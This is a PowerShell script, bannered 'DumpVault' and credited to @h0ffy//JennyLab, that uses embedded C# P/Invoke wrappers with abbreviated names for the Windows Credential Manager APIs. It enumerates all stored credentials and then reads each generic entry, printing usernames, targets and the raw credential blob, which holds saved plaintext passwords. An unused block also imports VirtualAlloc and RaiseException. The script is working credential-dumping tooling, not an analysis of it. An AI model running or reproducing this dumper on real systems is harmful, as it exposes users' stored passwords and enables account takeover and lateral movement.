
Param (

	[Parameter(Mandatory=$false)][Switch] $AddCrd,
	[Parameter(Mandatory=$false)][Switch] $DelCrd,
	[Parameter(Mandatory=$false)][Switch] $GetCrd,
	[Parameter(Mandatory=$false)][Switch] $ShoCrd,
	[Parameter(Mandatory=$false)][Switch] $RunTst,
	[Parameter(Mandatory=$false)][ValidateLength(1,32767)][String] $Tgt, 
	[Parameter(Mandatory=$false)][ValidateLength(1,512)][String] $Usr, 
	[Parameter(Mandatory=$false)][ValidateLength(1,512)][String] $Psw,
	[Parameter(Mandatory=$false)][ValidateLength(1,256)][String] $Cmt,
	[Parameter(Mandatory=$false)][Switch] $All,
	[Parameter(Mandatory=$false)][ValidateSet("GENERIC",
										  "DOMAIN_PASSWORD",
										  "DOMAIN_CERTIFICATE",
										  "DOMAIN_VISIBLE_PASSWORD",
										  "GENERIC_CERTIFICATE",
										  "DOMAIN_EXTENDED",
										  "MAXIMUM",
										  "MAXIMUM_EX")][String] $CrdTyp = "GENERIC",
	[Parameter(Mandatory=$false)][ValidateSet("SESSION",
									  "LOCAL_MACHINE",
									  "ENTERPRISE")][String] $CrdPrst = "ENTERPRISE"

)


$BANNER = @"
 /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\ 
( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )
 > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ < 
 /\_/\   8888888b.                                                    888     888                  888 888       /\_/\ 
( o.o )  888  "Y88b                                                   888     888                  888 888      ( o.o )
 > ^ <   888    888                                                   888     888                  888 888       > ^ < 
 /\_/\   888    888 888  888 88888b.d88b.  88888b.  88888b.  888  888 Y88b   d88P 8888b.  888  888 888 888888    /\_/\ 
( o.o )  888    888 888  888 888 "888 "88b 888 "88b 888 "88b 888  888  Y88b d88P     "88b 888  888 888 888      ( o.o )
 > ^ <   888    888 888  888 888  888  888 888  888 888  888 888  888   Y88o88P  .d888888 888  888 888 888       > ^ < 
 /\_/\   888  .d88P Y88b 888 888  888  888 888 d88P 888 d88P Y88b 888    Y888P   888  888 Y88b 888 888 Y88b.     /\_/\ 
( o.o )  8888888P"   "Y88888 888  888  888 88888P"  88888P"   "Y88888     Y8P    "Y888888  "Y88888 888  "Y888   ( o.o )
 > ^ <                                     888      888           888                                            > ^ < 
 /\_/\    @h0ffy//JennyLab                 888      888      Y8b d88P                                            /\_/\ 
( o.o )   Alberto García de Dios           888      888       "Y88P"                                            ( o.o )
 > ^ <                                                                                                           > ^ < 
 /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\ 
( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )
 > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ < 
"@

#region Pinvoke
[String] $PsCrdUtils = @"
using System; using System.Runtime.InteropServices;
namespace PosoUtil {
    public class CrdMn {
        #region Imports
        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredDeleteW", CharSet = CharSet.Unicode)]
        private static extern bool CrdDelW([In] string tgt, [In] CRD_TYP typ, [In] int rsrvdFlg);
        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredEnumerateW", CharSet = CharSet.Unicode)]
        private static extern bool CrdEnumW([In] string fltr, [In] int flgs, out int cnt, out IntPtr CrdPtr);
        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredFree")]
        private static extern void CrdFr([In] IntPtr crd);
        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredReadW", CharSet = CharSet.Unicode)]
        private static extern bool CrdRdW([In] string tgt, [In] CRD_TYP typ, [In] int rsrvdFlg, out IntPtr CrdPtr);
        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredWriteW", CharSet = CharSet.Unicode)]
        private static extern bool CrdWrW([In] ref Crd userCrd, [In] UInt32 flgs);
        #endregion

        #region Fields
        public enum CRD_FLGS : uint { NONE = 0x0, PRMPT_NOW = 0x2, USR_TGT = 0x4 }
        public enum CRD_ERRS : uint { ERR_SUC = 0x0, ERR_INV_PARAM = 0x80070057, ERR_INV_FLGS = 0x800703EC, ERR_NOT_FND = 0x80070490, ERR_NO_LGN_SESS = 0x80070520, ERR_BAD_USR = 0x8007089A }
        public enum CRD_PRST : uint { SESS = 1, LCL_MCHN = 2, ENTRPRSE = 3 }
        public enum CRD_TYP : uint { GNRIC = 1, DOM_PSW = 2, DOM_CRT = 3, DOM_VPSW = 4, GNRIC_CRT = 5, DOM_EXT = 6, MAX = 7, MAX_EX = (MAX + 1000) }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct Crd { public CRD_FLGS Flgs; public CRD_TYP Typ; public string TgtName; public string Cmt; public DateTime LstWrtn; public UInt32 CrdBlobSz; public string CrdBlob; public CRD_PRST Prst; public UInt32 AttrCnt; public IntPtr Attrs; public string TgtAlias; public string UsrName; }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct NatCrd { public CRD_FLGS Flgs; public CRD_TYP Typ; public IntPtr TgtName; public IntPtr Cmt; public System.Runtime.InteropServices.ComTypes.FILETIME LstWrtn; public UInt32 CrdBlobSz; public IntPtr CrdBlob; public UInt32 Prst; public UInt32 AttrCnt; public IntPtr Attrs; public IntPtr TgtAlias; public IntPtr UsrName; }
        #endregion

        #region Child Class
        private class CritCrdHndl : Microsoft.Win32.SafeHandles.CriticalHandleZeroOrMinusOneIsInvalid {
            public CritCrdHndl(IntPtr preHndl) { SetHandle(preHndl); }
            private Crd XltNatCrd(IntPtr pCrd) {
                NatCrd nCrd = (NatCrd)Marshal.PtrToStructure(pCrd, typeof(NatCrd)); Crd crd = new Crd(); crd.Typ = nCrd.Typ; crd.Flgs = nCrd.Flgs; crd.Prst = (CRD_PRST)nCrd.Prst;
                long LstWrtn = nCrd.LstWrtn.dwHighDateTime; LstWrtn = (LstWrtn << 32) + nCrd.LstWrtn.dwLowDateTime; crd.LstWrtn = DateTime.FromFileTime(LstWrtn);
                crd.UsrName = Marshal.PtrToStringUni(nCrd.UsrName); crd.TgtName = Marshal.PtrToStringUni(nCrd.TgtName); crd.TgtAlias = Marshal.PtrToStringUni(nCrd.TgtAlias); crd.Cmt = Marshal.PtrToStringUni(nCrd.Cmt); crd.CrdBlobSz = nCrd.CrdBlobSz;
                if (0 < nCrd.CrdBlobSz) { crd.CrdBlob = Marshal.PtrToStringUni(nCrd.CrdBlob, (int)nCrd.CrdBlobSz / 2); } return crd;
            }
            public Crd GetCrd() { if (IsInvalid) { throw new InvalidOperationException("Invalid CritHndl!"); } Crd crd = XltNatCrd(handle); return crd; }
            public Crd[] GetCrds(int cnt) {
                if (IsInvalid) { throw new InvalidOperationException("Invalid CritHndl!"); } Crd[] Crds = new Crd[cnt]; IntPtr pTmp = IntPtr.Zero;
                for (int i = 0; i < cnt; i++) { pTmp = Marshal.ReadIntPtr(handle, i * IntPtr.Size); Crds[i] = XltNatCrd(pTmp); } return Crds;
            }
            override protected bool ReleaseHandle() { if (IsInvalid) { return false; } CrdFr(handle); SetHandleAsInvalid(); return true; }
        }
        #endregion

        #region Custom API
        public static int CrdDel(string tgt, CRD_TYP typ) { if (!CrdDelW(tgt, typ, 0)) { return Marshal.GetHRForLastWin32Error(); } return 0; }
        public static int CrdEnum(string fltr, out Crd[] Crds) {
            int cnt = 0; int Flgs = 0x0; if (string.IsNullOrEmpty(fltr) || "*" == fltr) { fltr = null; if (6 <= Environment.OSVersion.Version.Major) { Flgs = 0x1; } }
            IntPtr pCrds = IntPtr.Zero; if (!CrdEnumW(fltr, Flgs, out cnt, out pCrds)) { Crds = null; return Marshal.GetHRForLastWin32Error(); }
            CritCrdHndl CrdHndl = new CritCrdHndl(pCrds); Crds = CrdHndl.GetCrds(cnt); return 0;
        }
        public static int CrdRd(string tgt, CRD_TYP typ, out Crd Crd) {
            IntPtr pCrd = IntPtr.Zero; Crd = new Crd(); if (!CrdRdW(tgt, typ, 0, out pCrd)) { return Marshal.GetHRForLastWin32Error(); }
            CritCrdHndl CrdHndl = new CritCrdHndl(pCrd); Crd = CrdHndl.GetCrd(); return 0;
        }
        public static int CrdWr(Crd usrCrd) { if (!CrdWrW(ref usrCrd, 0)) { return Marshal.GetHRForLastWin32Error(); } return 0; }
        #endregion
    }
}
"@
#endregion

#region sandbox
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class APIException {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
    [DllImport("kernel32.dll")]
    public static extern void RaiseException(uint dwExceptionCode, uint dwExceptionFlags, uint nNumberOfArguments, IntPtr lpArguments);
}
"@ -Namespace Native -PassThru


#endregion

Write-Host $banner -ForegroundColor Green
Write-Host ""
Write-Host ""
Sleep 2


$PsCrdMn = $null
try { $PsCrdMn = [PosoUtil.CrdMn] } catch { $Error.RemoveAt($Error.Count-1) }
if ($null -eq $PsCrdMn) { Add-Type $PsCrdUtils }

$Targets = @()

# Enumerar todas las credenciales
[PosoUtil.CrdMn+Crd[]]$credenciales = @()
$result = [PosoUtil.CrdMn]::CrdEnum("*", [ref]$credenciales)
if ($result -eq 0) {
    foreach ($cred in $credenciales) {
        Write-Host -NoNewLine "Usuario: " -ForegroundColor  "Cyan"
        Write-Host -NoNewLine  "$($cred.UsrName)`t`t`t" -ForegroundColor "Red"
    
	    $Targets+=$($cred.TgtName)
        if ($($cred.TgtName) -match "^(.*?):.*?=(.*)$") {
            $type = $matches[1]
            $real_target = $matches[2]
            Write-Host -NoNewLine "Target: " -ForegroundColor "Blue"
            Write-Host  "$real_target" -ForegroundColor  "Magenta"  
        }
        else {
            Write-Host -NoNewLine "Target: " -ForegroundColor "Blue"
            Write-Host "$($cred.TgtName)" -ForegroundColor  "Magenta"  
        }
        
    }
} else {
    Write-Host "Target: $target ($result)"
    Write-Host ""; Write-Host ""; 
}

Write-Host "";
Write-Host "";

Sleep 5
## Leer una credencial específica
foreach ($target in $Targets) {

    [PosoUtil.CrdMn+Crd]$credencial = New-Object PosoUtil.CrdMn+Crd
    $result = [PosoUtil.CrdMn]::CrdRd($target, [PosoUtil.CrdMn+CRD_TYP]::GNRIC, [ref]$credencial)
    #$credencial | Format-List -Property *
    #$credencial | ForEach-Object { $_.PSObject.Properties.Name + ": " + $_.PSObject.Properties.Value }
    if ($result -eq 0) {
    #$credencial | Get-Member
    Write-Host -NoNewLine "Usuario: "
    Write-Host "$($credencial.UsrName)" -ForegroundColor "Red"
    Write-Host -NoNewLine "Objeto: "
    Write-Host "$($credencial.TgtName)" -ForegroundColor "Magenta"
    #Write-Host "Target: $target"
    Write-Host -NoNewLine "Prst: " 
    Write-Host -ForegroundColor "Green" "$($credencial.Prst)"
    Write-Host -NoNewLine "Type: "
    Write-Host -ForegroundColor "Green" "$($credencial.Typ)"
    Write-Host -NoNewLine "Cmt: "
    Write-Host -ForegroundColor "Cyan" "$($credencial.Cmt)"
    Write-Host "LstWrtn: $($credencial.LstWrtn)"
    Write-Host "Attrs: $($credencial.Attrs)"
    Write-Host "AttrsCnt: $($credencial.AttrsCnt)"
    Write-Host "Alias: $($credencial.TgtAlias)"
    Write-Host "Flgs: $($credencial.Flgs)"
    Write-Host "CrdBlobSz: $($credencial.CrdBlobSz)"
    Write-Host -NoNewLine "Raw: " 
    #Write-Host $credencial.CrdBlob -ForegroundColor "Magenta"
    if ($credencial.CrdBlob -ne $null) {
        Write-Host "$($credencial.CrdBlob)" -ForegroundColor "Magenta"
    }
    else {
        Write-Host "None" -ForegroundColor "Magenta"

    }
    Write-Host ""; Write-Host ""
    #Write-Host "Alias: $($credencial.TgtAlias), Type: $($credencial.Typ)"
    #Write-Host "Prst: $($credencial.Prst), Cmt: $($credencial.Cmt)"
    #Write-Host "Attrs: $($credencial.Attrs), Cmt: $($credencial.CrdBlob)"
    #Write-Host "Flgs: $($credencial.Flgs)"
    } else {
        Write-Host ""
        Write-Host "Usuario: $_, $target ($result)"
        Write-Host ""
    }

    #} catch {
        Write-Host "Target: $target - ERROR"
    #}

}
